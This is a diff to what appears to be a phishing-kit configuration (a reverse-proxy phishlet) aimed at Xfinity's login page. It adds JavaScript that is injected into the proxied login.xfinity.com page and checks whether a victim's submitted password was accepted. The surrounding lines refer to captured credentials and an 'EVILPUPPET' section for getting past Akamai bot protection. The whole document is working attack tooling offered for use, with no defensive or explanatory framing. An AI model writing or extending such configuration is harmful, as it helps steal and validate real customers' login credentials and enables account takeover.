@@ -72,6 +72,29 @@ credentials:
       page: '/login'
 
 # ============================================
+# JAVASCRIPT INJECTION FOR ERROR DETECTION
+# ============================================
+
+js_inject:
+  - trigger_domains: ['login.xfinity.com']
+    trigger_paths: ['/login']
+    script: |
+      (function() {
+        // Wait for page to fully load
+        setTimeout(function() {
+          // Check for Xfinity error message
+          const errorText = 'The Xfinity ID or password you entered was incorrect';
+          const bodyText = document.body.innerText || document.body.textContent;
+          
+          if (bodyText.includes(errorText)) {
+            console.log('[XFINITY] ❌ Login error detected - wrong password');
+          } else {
+            console.log('[XFINITY] ✅ No error detected - password may be correct');
+          }
+        }, 2000);
+      })();
+
+# ============================================
 # EVILPUPPET CONFIGURATION FOR AKAMAI BYPASS
 # ============================================
 
